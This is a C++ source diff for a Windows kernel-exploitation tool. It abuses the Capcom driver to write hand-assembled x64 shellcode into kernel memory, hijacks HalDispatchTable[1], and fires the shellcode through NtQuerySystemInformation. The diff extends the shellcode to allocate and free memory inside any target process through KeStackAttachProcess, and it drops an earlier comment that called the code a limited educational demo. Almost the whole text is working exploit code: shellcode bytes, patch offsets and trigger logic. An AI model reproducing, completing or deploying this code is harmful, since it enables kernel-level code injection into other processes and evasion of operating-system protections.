@@ -41,118 +41,191 @@ using ZwFreeVirtualMemory_t = NTSTATUS(NTAPI*)(
 // ShellcodeParams — contiguous block placed in kernel memory before the
 // shellcode bytes.  The shellcode uses absolute addressing to read its
 // arguments and write its results.
+//
+// Cross-process allocation is achieved via KeStackAttachProcess:
+//   1. PsLookupProcessByProcessId(targetPid, &eprocess)
+//   2. KeStackAttachProcess(eprocess, &apcState)
+//   3. ZwAllocateVirtualMemory(-1, ...)  — now allocates in target
+//   4. KeUnstackDetachProcess(&apcState)
+//   5. ObDereferenceObject(eprocess)
 // ---------------------------------------------------------------------------
 #pragma pack(push, 1)
 struct ShellcodeParams {
-    uint64_t fnZwAllocateVirtualMemory; // +0x00: ZwAllocateVirtualMemory address
-    uint64_t fnZwFreeVirtualMemory;     // +0x08: ZwFreeVirtualMemory address
-    uint64_t processHandle;             // +0x10: kernel handle to target process
-    uint64_t outBaseAddress;            // +0x18: [out] allocated/freed base address
-    uint64_t allocationSize;            // +0x20: size (in/out pointer target)
-    uint64_t protect;                   // +0x28: page protection for alloc
-    uint64_t ntStatus;                  // +0x30: [out] NTSTATUS from the call
-    uint64_t returnAddress;             // +0x38: reserved (unused — return via ret)
+    // ---- Kernel function pointers (resolved at init/runtime) ----
+    uint64_t fnZwAllocateVirtualMemory;     // +0x00
+    uint64_t fnZwFreeVirtualMemory;         // +0x08
+    uint64_t fnPsLookupProcessByProcessId;  // +0x10
+    uint64_t fnKeStackAttachProcess;        // +0x18
+    uint64_t fnKeUnstackDetachProcess;      // +0x20
+    uint64_t fnObDereferenceObject;         // +0x28
+
+    // ---- Input parameters ----
+    uint64_t targetPid;                     // +0x30: target process ID
+    uint64_t outBaseAddress;                // +0x38: [out] allocated/freed base address
+    uint64_t allocationSize;                // +0x40: size (in/out pointer target)
+    uint64_t protect;                       // +0x48: page protection for alloc
+
+    // ---- Output ----
+    uint64_t ntStatus;                      // +0x50: [out] NTSTATUS from kernel call
+    uint64_t returnAddress;                 // +0x58: reserved (unused — return via ret)
+
+    // ---- Intermediate storage (written by shellcode) ----
+    uint64_t eprocess;                      // +0x60: [out] EPROCESS from PsLookup
+    uint8_t  apcState[0x30];               // +0x68: KAPC_STATE storage (x64 = 0x30 bytes)
 };
 #pragma pack(pop)
 
 // =========================================================================
-//  x64 Shellcode — Allocate Virtual Memory
+//  x64 Shellcode — Allocate Virtual Memory (cross-process via KeStackAttachProcess)
 // =========================================================================
 //
-//  Register convention on entry (from HalDispatchTable dispatch):
-//    RCX = SystemInformationClass (0)
-//    RDX = SystemInformation buffer
-//    R8  = buffer length
-//    R9  = ReturnLength pointer
+// Register convention on entry (from HalDispatchTable dispatch):
+//   RCX = SystemInformationClass (0)
+//   RDX = SystemInformation buffer
+//   R8  = buffer length
+//   R9  = ReturnLength pointer
+// All values are ignored; the shellcode reads its own parameter block.
 //
-//  All values are ignored; the shellcode reads its own parameter block.
+// Logic:
+//   1. PsLookupProcessByProcessId(targetPid, &eprocess)
+//   2. KeStackAttachProcess(eprocess, &apcState)
+//   3. ZwAllocateVirtualMemory(-1, &outBase, 0, &size, MEM_COMMIT|MEM_RESERVE, protect)
+//   4. KeUnstackDetachProcess(&apcState)
+//   5. ObDereferenceObject(eprocess)
 //
-//  Byte layout (74 bytes):
-//   +0x00  sub   rsp, 0x28               ; shadow space
-//   +0x04  mov   r10, <paramsBase>       ; absolute address of ShellcodeParams
-//          --- patch offset 6: 8-byte paramsBase ---
-//   +0x0E  mov   rcx, [r10 + 0x10]       ; ProcessHandle
-//   +0x12  lea   rdx, [r10 + 0x18]       ; &outBaseAddress
-//   +0x16  xor   r8d, r8d                ; ZeroBits = 0
-//   +0x19  lea   r9,  [r10 + 0x20]       ; &allocationSize (pointer to size)
-//   +0x1D  mov   rax, 0x3000             ; MEM_COMMIT | MEM_RESERVE
-//   +0x24  mov   [rsp + 0x18], rax       ; AllocationType → callee [RSP+0x20]
-//   +0x29  mov   rax, [r10 + 0x28]       ; protect
-//   +0x2D  mov   [rsp + 0x20], rax       ; Protect → callee [RSP+0x28]
-//   +0x32  mov   rax, [r10 + 0x00]       ; fnZwAllocateVirtualMemory
-//   +0x35  call  rax                     ; ZwAllocateVirtualMemory(...)
-//   +0x37  mov   r10, <paramsBase>       ; reload (RAX clobbered by call)
-//          --- patch offset 57: 8-byte paramsBase ---
-//   +0x41  mov   [r10 + 0x30], rax       ; ntStatus = result
-//   +0x45  add   rsp, 0x28
-//   +0x49  ret
+// Prologue allocates 0x38 bytes (shadow 0x20 + 2 stack-arg slots 0x10 + 8 align).
+// paramsBase is stored at [rsp+0x30] and reloaded via that slot after each call
+// (r10 is volatile per x64 ABI), so only TWO patches are needed:
+//   - offset 0x06: 8-byte paramsBase (inside mov r10, imm64)
+//   - offset 0x23: 4-byte jnz disp32 (disp32 = target - end_of_instruction)
+//
+// Total shellcode size: 0x92 (146 bytes).
 
 static constexpr uint8_t kAllocShellcode[] = {
-    0x48, 0x83, 0xEC, 0x28,                   // 00: sub  rsp, 0x28
-    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 04: mov  r10, <paramsBase>
-    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 6)
-    0x49, 0x8B, 0x4A, 0x10,                   // 0E: mov  rcx, [r10+0x10]
-    0x49, 0x8D, 0x52, 0x18,                   // 12: lea  rdx, [r10+0x18]
-    0x45, 0x31, 0xC0,                         // 16: xor  r8d, r8d
-    0x4D, 0x8D, 0x4A, 0x20,                   // 19: lea  r9,  [r10+0x20]
-    0x48, 0xC7, 0xC0, 0x00, 0x30, 0x00, 0x00, // 1D: mov  rax, 0x3000
-    0x48, 0x89, 0x44, 0x24, 0x18,             // 24: mov  [rsp+0x18], rax
-    0x49, 0x8B, 0x42, 0x28,                   // 29: mov  rax, [r10+0x28]
-    0x48, 0x89, 0x44, 0x24, 0x20,             // 2D: mov  [rsp+0x20], rax
-    0x49, 0x8B, 0x02,                         // 32: mov  rax, [r10+0x00]
-    0xFF, 0xD0,                               // 35: call rax
-    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 37: mov  r10, <paramsBase>
-    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 57)
-    0x49, 0x89, 0x42, 0x30,                   // 41: mov  [r10+0x30], rax
-    0x48, 0x83, 0xC4, 0x28,                   // 45: add  rsp, 0x28
-    0xC3                                        // 49: ret
+    // ---- Prologue: save paramsBase on stack ----
+    0x48, 0x83, 0xEC, 0x38,                         // 00: sub rsp, 0x38
+    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,             // 04: mov r10, <paramsBase>
+    0x00, 0x00, 0x00, 0x00,                         //     (8-byte imm at offset 6)
+    0x4C, 0x89, 0x54, 0x24, 0x30,                   // 0E: mov [rsp+0x30], r10
+
+    // ---- Step 1: PsLookupProcessByProcessId(targetPid, &eprocess) ----
+    0x49, 0x8B, 0x4A, 0x30,                         // 13: mov rcx, [r10+0x30]   ; targetPid
+    0x49, 0x8D, 0x52, 0x60,                         // 17: lea rdx, [r10+0x60]   ; &eprocess
+    0x41, 0xFF, 0x52, 0x10,                         // 1B: call [r10+0x10]       ; PsLookupProcessByProcessId
+    0x85, 0xC0,                                     // 1F: test eax, eax
+    0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,             // 21: jnz alloc_error        ; (4-byte disp32 at offset 22)
+
+    // ---- Step 2: KeStackAttachProcess(eprocess, &apcState) ----
+    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 27: mov r10, [rsp+0x30]   ; reload
+    0x49, 0x8B, 0x4A, 0x60,                         // 2C: mov rcx, [r10+0x60]   ; eprocess
+    0x49, 0x8D, 0x52, 0x68,                         // 30: lea rdx, [r10+0x68]   ; &apcState
+    0x41, 0xFF, 0x52, 0x18,                         // 34: call [r10+0x18]       ; KeStackAttachProcess
+
+    // ---- Step 3: ZwAllocateVirtualMemory(-1, &outBase, 0, &size, 0x3000, protect) ----
+    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 38: mov r10, [rsp+0x30]   ; reload
+    0x48, 0x83, 0xC9, 0xFF,                         // 3D: or  rcx, -1            ; pseudo-handle (target after attach)
+    0x49, 0x8D, 0x52, 0x38,                         // 41: lea rdx, [r10+0x38]   ; &outBaseAddress
+    0x45, 0x31, 0xC0,                               // 45: xor r8d, r8d           ; ZeroBits = 0
+    0x4D, 0x8D, 0x4A, 0x40,                         // 48: lea r9,  [r10+0x40]   ; &allocationSize
+    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x30,       // 4C: mov qword [rsp+0x20], 0x3000  ; MEM_COMMIT|MEM_RESERVE (5th arg)
+    0x00, 0x00,
+    0x49, 0x8B, 0x42, 0x48,                         // 55: mov rax, [r10+0x48]   ; protect
+    0x48, 0x89, 0x44, 0x24, 0x28,                   // 59: mov [rsp+0x28], rax   ; protect (6th arg)
+    0x41, 0xFF, 0x12,                               // 5E: call [r10]             ; ZwAllocateVirtualMemory
+
+    // ---- Save NTSTATUS ----
+    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 61: mov r10, [rsp+0x30]
+    0x49, 0x89, 0x42, 0x50,                         // 66: mov [r10+0x50], rax   ; save ntStatus
+
+    // ---- Step 4: KeUnstackDetachProcess(&apcState) ----
+    0x49, 0x8D, 0x4A, 0x68,                         // 6A: lea rcx, [r10+0x68]
+    0x41, 0xFF, 0x52, 0x20,                         // 6E: call [r10+0x20]       ; KeUnstackDetachProcess
+
+    // ---- Step 5: ObDereferenceObject(eprocess) ----
+    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 72: mov r10, [rsp+0x30]
+    0x49, 0x8B, 0x4A, 0x60,                         // 77: mov rcx, [r10+0x60]
+    0x41, 0xFF, 0x52, 0x28,                         // 7B: call [r10+0x28]       ; ObDereferenceObject
+
+    // ---- Epilogue ----
+    0x48, 0x83, 0xC4, 0x38,                         // 7F: add rsp, 0x38
+    0xC3,                                           // 83: ret
+
+    // ---- alloc_error: store error status and return ----
+    0x4C, 0x8B, 0x54, 0x24, 0x30,                   // 84: mov r10, [rsp+0x30]
+    0x49, 0x89, 0x42, 0x50,                         // 89: mov [r10+0x50], rax
+    0x48, 0x83, 0xC4, 0x38,                         // 8D: add rsp, 0x38
+    0xC3                                            // 91: ret
 };
 static constexpr size_t kAllocShellcodeSize = sizeof(kAllocShellcode);
-static constexpr size_t kAllocPatchOffset1  = 6;   // first  paramsBase immediate
-static constexpr size_t kAllocPatchOffset2  = 57;  // second paramsBase immediate
+static_assert(kAllocShellcodeSize == 0x92, "Alloc shellcode size mismatch");
+static constexpr size_t kAllocPatchParamsBase = 6;   // paramsBase imm64 (49 BA ...)
+static constexpr size_t kAllocPatchJnz       = 0x23; // jnz disp32 (0F 85 xx xx xx xx)
 
 // =========================================================================
-//  x64 Shellcode — Free Virtual Memory
+//  x64 Shellcode — Free Virtual Memory (cross-process via KeStackAttachProcess)
 // =========================================================================
 //
-//  ZwFreeVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG FreeType)
-//  All four args in registers — no stack parameters needed.
+// Same KeStackAttachProcess / KeUnstackDetachProcess sequence as the alloc
+// shellcode.  ZwFreeVirtualMemory takes only 4 register args so the stack
+// frame is the standard 0x28-byte shadow space.
 //
-//  Byte layout (58 bytes):
-//   +0x00  sub   rsp, 0x28               ; shadow space
-//   +0x04  mov   r10, <paramsBase>
-//          --- patch offset 6: 8-byte paramsBase ---
-//   +0x0E  mov   rcx, [r10 + 0x10]       ; ProcessHandle
-//   +0x12  lea   rdx, [r10 + 0x18]       ; &outBaseAddress
-//   +0x16  lea   r8,  [r10 + 0x20]       ; &allocationSize (pointer to size)
-//   +0x1A  mov   r9,  0x8000             ; MEM_RELEASE
-//   +0x21  mov   rax, [r10 + 0x08]       ; fnZwFreeVirtualMemory
-//   +0x25  call  rax
-//   +0x27  mov   r10, <paramsBase>       ; reload
-//          --- patch offset 41: 8-byte paramsBase ---
-//   +0x31  mov   [r10 + 0x30], rax       ; ntStatus = result
-//   +0x35  add   rsp, 0x28
-//   +0x39  ret
+// Total shellcode size: 0x85 (133 bytes).
 
 static constexpr uint8_t kFreeShellcode[] = {
-    0x48, 0x83, 0xEC, 0x28,                   // 00: sub  rsp, 0x28
-    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 04: mov  r10, <paramsBase>
-    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 6)
-    0x49, 0x8B, 0x4A, 0x10,                   // 0E: mov  rcx, [r10+0x10]
-    0x49, 0x8D, 0x52, 0x18,                   // 12: lea  rdx, [r10+0x18]
-    0x4D, 0x8D, 0x42, 0x20,                   // 16: lea  r8,  [r10+0x20]
-    0x49, 0xC7, 0xC1, 0x00, 0x80, 0x00, 0x00, // 1A: mov  r9,  0x8000
-    0x49, 0x8B, 0x42, 0x08,                   // 21: mov  rax, [r10+0x08]
-    0xFF, 0xD0,                               // 25: call rax
-    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 27: mov  r10, <paramsBase>
-    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 41)
-    0x49, 0x89, 0x42, 0x30,                   // 31: mov  [r10+0x30], rax
-    0x48, 0x83, 0xC4, 0x28,                   // 35: add  rsp, 0x28
-    0xC3                                        // 39: ret
+    // ---- Prologue: save paramsBase on stack ----
+    0x48, 0x83, 0xEC, 0x28,                         // 00: sub rsp, 0x28
+    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,             // 04: mov r10, <paramsBase>
+    0x00, 0x00, 0x00, 0x00,                         //     (8-byte imm at offset 6)
+    0x4C, 0x89, 0x54, 0x24, 0x20,                   // 0E: mov [rsp+0x20], r10
+
+    // ---- Step 1: PsLookupProcessByProcessId(targetPid, &eprocess) ----
+    0x49, 0x8B, 0x4A, 0x30,                         // 13: mov rcx, [r10+0x30]
+    0x49, 0x8D, 0x52, 0x60,                         // 17: lea rdx, [r10+0x60]
+    0x41, 0xFF, 0x52, 0x10,                         // 1B: call [r10+0x10]       ; PsLookupProcessByProcessId
+    0x85, 0xC0,                                     // 1F: test eax, eax
+    0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,             // 21: jnz free_error         ; (4-byte disp32 at offset 22)
+
+    // ---- Step 2: KeStackAttachProcess(eprocess, &apcState) ----
+    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 27: mov r10, [rsp+0x20]
+    0x49, 0x8B, 0x4A, 0x60,                         // 2C: mov rcx, [r10+0x60]
+    0x49, 0x8D, 0x52, 0x68,                         // 30: lea rdx, [r10+0x68]
+    0x41, 0xFF, 0x52, 0x18,                         // 34: call [r10+0x18]       ; KeStackAttachProcess
+
+    // ---- Step 3: ZwFreeVirtualMemory(-1, &outBase, &size, MEM_RELEASE) ----
+    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 38: mov r10, [rsp+0x20]
+    0x48, 0x83, 0xC9, 0xFF,                         // 3D: or  rcx, -1
+    0x49, 0x8D, 0x52, 0x38,                         // 41: lea rdx, [r10+0x38]   ; &outBaseAddress
+    0x4D, 0x8D, 0x42, 0x40,                         // 45: lea r8,  [r10+0x40]   ; &allocationSize
+    0x49, 0xC7, 0xC1, 0x00, 0x80, 0x00, 0x00,       // 49: mov r9,  0x8000        ; MEM_RELEASE
+    0x41, 0xFF, 0x52, 0x08,                         // 50: call [r10+0x08]       ; ZwFreeVirtualMemory
+
+    // ---- Save NTSTATUS ----
+    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 54: mov r10, [rsp+0x20]
+    0x49, 0x89, 0x42, 0x50,                         // 59: mov [r10+0x50], rax
+
+    // ---- Step 4: KeUnstackDetachProcess(&apcState) ----
+    0x49, 0x8D, 0x4A, 0x68,                         // 5D: lea rcx, [r10+0x68]
+    0x41, 0xFF, 0x52, 0x20,                         // 61: call [r10+0x20]       ; KeUnstackDetachProcess
+
+    // ---- Step 5: ObDereferenceObject(eprocess) ----
+    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 65: mov r10, [rsp+0x20]
+    0x49, 0x8B, 0x4A, 0x60,                         // 6A: mov rcx, [r10+0x60]
+    0x41, 0xFF, 0x52, 0x28,                         // 6E: call [r10+0x28]       ; ObDereferenceObject
+
+    // ---- Epilogue ----
+    0x48, 0x83, 0xC4, 0x28,                         // 72: add rsp, 0x28
+    0xC3,                                           // 76: ret
+
+    // ---- free_error: store error status and return ----
+    0x4C, 0x8B, 0x54, 0x24, 0x20,                   // 77: mov r10, [rsp+0x20]
+    0x49, 0x89, 0x42, 0x50,                         // 7C: mov [r10+0x50], rax
+    0x48, 0x83, 0xC4, 0x28,                         // 80: add rsp, 0x28
+    0xC3                                            // 84: ret
 };
 static constexpr size_t kFreeShellcodeSize = sizeof(kFreeShellcode);
-static constexpr size_t kFreePatchOffset1  = 6;   // first  paramsBase immediate
-static constexpr size_t kFreePatchOffset2  = 41;  // second paramsBase immediate
+static_assert(kFreeShellcodeSize == 0x85, "Free shellcode size mismatch");
+static constexpr size_t kFreePatchParamsBase = 6;   // paramsBase imm64 (49 BA ...)
+static constexpr size_t kFreePatchJnz       = 0x23; // jnz disp32 (0F 85 xx xx xx xx)
 
 // =========================================================================
 //  Singleton
@@ -215,9 +288,8 @@ bool KernelExec::Initialize() {
     for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
         IMAGE_SECTION_HEADER section = capcom.Read<IMAGE_SECTION_HEADER>(
             4, sectionTable + i * sizeof(IMAGE_SECTION_HEADER));
-        // Match either ".data" or "PAGE" (some kernels put writable data in PAGE)
-        if (memcmp(section.Name, ".data", 5) == 0 ||
-            memcmp(section.Name, "PAGE", 4) == 0) {
+        // Only target ".data" — PAGE sections are pageable code (RX), not writable data.
+        if (memcmp(section.Name, ".data", 5) == 0) {
             dataSectionBase = m_kernelBase + section.VirtualAddress;
             dataSectionSize = section.Misc.VirtualSize;
             break;
@@ -226,15 +298,17 @@ bool KernelExec::Initialize() {
 
     if (!dataSectionBase || dataSectionSize < 0x1000) return false;
 
-    // Scan for a 256-byte aligned block of zeros inside the writable section.
+    // Scan for a 512-byte aligned block of zeros inside the writable section.
+    // The combined params + max(shellcode) is ~0x12A bytes; a 0x200 (512-byte)
+    // zero-filled block provides sufficient headroom.
     m_shellcodeAddr = 0;
     for (uintptr_t scan = dataSectionBase;
-         scan < dataSectionBase + dataSectionSize - 0x100;
+         scan < dataSectionBase + dataSectionSize - 0x200;
          scan += 0x100) {
-        std::vector<uint8_t> chunk(0x100);
-        if (capcom.ReadMemory(4, scan, chunk.data(), 0x100)) {
+        std::vector<uint8_t> chunk(0x200);
+        if (capcom.ReadMemory(4, scan, chunk.data(), 0x200)) {
             bool allZero = true;
-            for (size_t j = 0; j < 0x100; ++j) {
+            for (size_t j = 0; j < 0x200; ++j) {
                 if (chunk[j] != 0x00) { allZero = false; break; }
             }
             if (allZero) {
@@ -263,52 +337,67 @@ void KernelExec::Shutdown() {
 }
 
 // =========================================================================
-//  AllocateRemoteMemory — allocate virtual memory in a target process using
-//  kernel shellcode that calls ZwAllocateVirtualMemory.
-//
-//  NOTE (educational): allocation occurs in the context of the calling
-//  thread (our process) because cross-process allocation requires
-//  KeStackAttachProcess + EPROCESS resolution, which is beyond the scope
-//  of this simplified HalDispatchTable hijack demo.
-//  The `targetPid` parameter is accepted for API compatibility but is
-//  not currently used by the shellcode.  To target another process, the
-//  shellcode would need to resolve PsLookupProcessByProcessId and call
-//  KeStackAttachProcess / KeUnstackDetachProcess.
+//  AllocateRemoteMemory — allocate virtual memory in a TARGET process using
+//  kernel shellcode.  The shellcode uses KeStackAttachProcess to switch the
+//  current thread's address space to the target before calling
+//  ZwAllocateVirtualMemory.  This guarantees the allocation lands in the
+//  target process, not the injector.
 // =========================================================================
 
 uint64_t KernelExec::AllocateRemoteMemory(DWORD targetPid, uintptr_t& outBase,
                                            size_t size, DWORD protect,
                                            HANDLE* outHandle) {
-    (void)targetPid; // reserved for future cross-process support
-
     auto& capcom = CapcomDriver::GetInstance();
     if (!m_initialized || !capcom.IsLoaded())
         return 0xC0000001; // STATUS_UNSUCCESSFUL
 
+    // ---- Resolve all six kernel functions ----
+    uint64_t fnZwAlloc   = FindKernelExport("ZwAllocateVirtualMemory");
+    uint64_t fnZwFree    = FindKernelExport("ZwFreeVirtualMemory");
+    uint64_t fnPsLookup  = FindKernelExport("PsLookupProcessByProcessId");
+    uint64_t fnKeAttach  = FindKernelExport("KeStackAttachProcess");
+    uint64_t fnKeDetach  = FindKernelExport("KeUnstackDetachProcess");
+    uint64_t fnObDeref   = FindKernelExport("ObDereferenceObject");
+
+    if (!fnZwAlloc || !fnPsLookup || !fnKeAttach || !fnKeDetach || !fnObDeref)
+        return 0xC0000001;
+
     // ---- Build the parameter block ----
     ShellcodeParams params{};
-    params.fnZwAllocateVirtualMemory = FindKernelExport("ZwAllocateVirtualMemory");
-    params.fnZwFreeVirtualMemory     = FindKernelExport("ZwFreeVirtualMemory");
-    params.processHandle             = reinterpret_cast<uint64_t>(
-        reinterpret_cast<HANDLE>(static_cast<int64_t>(-1))); // pseudo-handle for current process
-    params.allocationSize            = size;
-    params.protect                   = protect;
-    params.outBaseAddress            = 0;
-    params.ntStatus                  = 0;
-    params.returnAddress             = 0;
-
-    if (!params.fnZwAllocateVirtualMemory)
-        return 0xC0000001;
+    params.fnZwAllocateVirtualMemory    = fnZwAlloc;
+    params.fnZwFreeVirtualMemory        = fnZwFree;   // unused by alloc
+    params.fnPsLookupProcessByProcessId = fnPsLookup;
+    params.fnKeStackAttachProcess       = fnKeAttach;
+    params.fnKeUnstackDetachProcess     = fnKeDetach;
+    params.fnObDereferenceObject        = fnObDeref;
+    params.targetPid                    = static_cast<uint64_t>(targetPid);
+    params.outBaseAddress               = 0;
+    params.allocationSize               = size;
+    params.protect                      = protect;
+    params.ntStatus                     = 0;
+    params.returnAddress                = 0;
+    params.eprocess                     = 0;
+    std::memset(params.apcState, 0, sizeof(params.apcState));
 
     // ---- Prepare shellcode buffer: [params] [shellcode] ----
     std::vector<uint8_t> kernelBuf(sizeof(ShellcodeParams) + kAllocShellcodeSize);
     std::memcpy(kernelBuf.data(), &params, sizeof(params));
 
-    // Copy the alloc shellcode template and patch in the params base address
+    // Copy the alloc shellcode template and patch in the params base address.
     uint8_t patchedShellcode[kAllocShellcodeSize];
     std::memcpy(patchedShellcode, kAllocShellcode, kAllocShellcodeSize);
-    std::memcpy(patchedShellcode + kAllocPatchOffset1, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
-    std::memcpy(patchedShellcode + kAllocPatchOffset2, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
+
+    // Patch 1: paramsBase at offset kAllocPatchParamsBase (6)
+    std::memcpy(patchedShellcode + kAllocPatchParamsBase,
+                &m_shellcodeAddr, sizeof(m_shellcodeAddr));
+
+    // Patch 2: jnz disp32 at offset kAllocPatchJnz (0x23)
+    // alloc_error label is at offset 0x84, jnz instruction ends at 0x23+4=0x27
+    // disp32 = 0x84 - 0x27 = 0x5D
+    constexpr uint32_t kAllocJnzDisp = 0x84 - (kAllocPatchJnz + 4);
+    std::memcpy(patchedShellcode + kAllocPatchJnz,
+                &kAllocJnzDisp, sizeof(kAllocJnzDisp));
+
     std::memcpy(kernelBuf.data() + sizeof(params), patchedShellcode, kAllocShellcodeSize);
 
     // ---- Write parameter block + shellcode into kernel memory ----
@@ -321,12 +410,8 @@ uint64_t KernelExec::AllocateRemoteMemory(DWORD targetPid, uintptr_t& outBase,
     capcom.Write<uintptr_t>(4, halQuerySlot, shellcodeBase);
 
     // ---- Trigger execution via NtQuerySystemInformation ----
-    // SystemInformationClass 0 causes the kernel to dispatch through
-    // HalDispatchTable[1] (HalQuerySystemInformation), which now points
-    // to our shellcode.
     ULONG dummy = 0;
     NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &dummy, 0, &dummy);
-    // Shellcode has now executed; results are in the kernel buffer.
 
     // ---- Restore HalDispatchTable[1] ----
     capcom.Write<uintptr_t>(4, halQuerySlot, m_originalPtr);
@@ -335,46 +420,69 @@ uint64_t KernelExec::AllocateRemoteMemory(DWORD targetPid, uintptr_t& outBase,
     ShellcodeParams resultParams = capcom.Read<ShellcodeParams>(4, m_shellcodeAddr);
     outBase = resultParams.outBaseAddress;
     if (outHandle)
-        *outHandle = reinterpret_cast<HANDLE>(resultParams.processHandle);
+        *outHandle = nullptr; // no user-mode handle is created by kernel alloc
 
     return resultParams.ntStatus;
 }
 
 // =========================================================================
-//  FreeRemoteMemory — free virtual memory via kernel shellcode that calls
-//  ZwFreeVirtualMemory with MEM_RELEASE.
+//  FreeRemoteMemory — free virtual memory in a target process via kernel
+//  shellcode that uses KeStackAttachProcess to operate in the target's
+//  address space, then calls ZwFreeVirtualMemory with MEM_RELEASE.
 // =========================================================================
 
 uint64_t KernelExec::FreeRemoteMemory(DWORD targetPid, uintptr_t base, size_t size) {
-    (void)targetPid; // reserved for future cross-process support
-
     auto& capcom = CapcomDriver::GetInstance();
     if (!m_initialized || !capcom.IsLoaded())
         return 0xC0000001; // STATUS_UNSUCCESSFUL
 
+    // ---- Resolve all six kernel functions ----
+    uint64_t fnZwAlloc   = FindKernelExport("ZwAllocateVirtualMemory");
+    uint64_t fnZwFree    = FindKernelExport("ZwFreeVirtualMemory");
+    uint64_t fnPsLookup  = FindKernelExport("PsLookupProcessByProcessId");
+    uint64_t fnKeAttach  = FindKernelExport("KeStackAttachProcess");
+    uint64_t fnKeDetach  = FindKernelExport("KeUnstackDetachProcess");
+    uint64_t fnObDeref   = FindKernelExport("ObDereferenceObject");
+
+    if (!fnZwFree || !fnPsLookup || !fnKeAttach || !fnKeDetach || !fnObDeref)
+        return 0xC0000001;
+
     // ---- Build the parameter block ----
     ShellcodeParams params{};
-    params.fnZwAllocateVirtualMemory = 0; // not used by free
-    params.fnZwFreeVirtualMemory     = FindKernelExport("ZwFreeVirtualMemory");
-    params.processHandle             = reinterpret_cast<uint64_t>(
-        reinterpret_cast<HANDLE>(static_cast<int64_t>(-1)));
-    params.outBaseAddress            = base;
-    params.allocationSize            = size;  // 0 for MEM_RELEASE semantics
-    params.protect                   = 0;
-    params.ntStatus                  = 0;
-
-    if (!params.fnZwFreeVirtualMemory)
-        return 0xC0000001;
+    params.fnZwAllocateVirtualMemory    = fnZwAlloc;  // unused by free
+    params.fnZwFreeVirtualMemory        = fnZwFree;
+    params.fnPsLookupProcessByProcessId = fnPsLookup;
+    params.fnKeStackAttachProcess       = fnKeAttach;
+    params.fnKeUnstackDetachProcess     = fnKeDetach;
+    params.fnObDereferenceObject        = fnObDeref;
+    params.targetPid                    = static_cast<uint64_t>(targetPid);
+    params.outBaseAddress               = base;
+    params.allocationSize               = size;  // 0 for MEM_RELEASE semantics
+    params.protect                      = 0;
+    params.ntStatus                     = 0;
+    params.returnAddress                = 0;
+    params.eprocess                     = 0;
+    std::memset(params.apcState, 0, sizeof(params.apcState));
 
     // ---- Prepare shellcode buffer: [params] [shellcode] ----
     std::vector<uint8_t> kernelBuf(sizeof(ShellcodeParams) + kFreeShellcodeSize);
     std::memcpy(kernelBuf.data(), &params, sizeof(params));
 
-    // Copy the free shellcode template and patch in the params base address
+    // Copy the free shellcode template and patch in the params base address.
     uint8_t patchedShellcode[kFreeShellcodeSize];
     std::memcpy(patchedShellcode, kFreeShellcode, kFreeShellcodeSize);
-    std::memcpy(patchedShellcode + kFreePatchOffset1, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
-    std::memcpy(patchedShellcode + kFreePatchOffset2, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
+
+    // Patch 1: paramsBase at offset kFreePatchParamsBase (6)
+    std::memcpy(patchedShellcode + kFreePatchParamsBase,
+                &m_shellcodeAddr, sizeof(m_shellcodeAddr));
+
+    // Patch 2: jnz disp32 at offset kFreePatchJnz (0x23)
+    // free_error label is at offset 0x77, jnz instruction ends at 0x23+4=0x27
+    // disp32 = 0x77 - 0x27 = 0x50
+    constexpr uint32_t kFreeJnzDisp = 0x77 - (kFreePatchJnz + 4);
+    std::memcpy(patchedShellcode + kFreePatchJnz,
+                &kFreeJnzDisp, sizeof(kFreeJnzDisp));
+
     std::memcpy(kernelBuf.data() + sizeof(params), patchedShellcode, kFreeShellcodeSize);
 
     // ---- Write to kernel memory ----
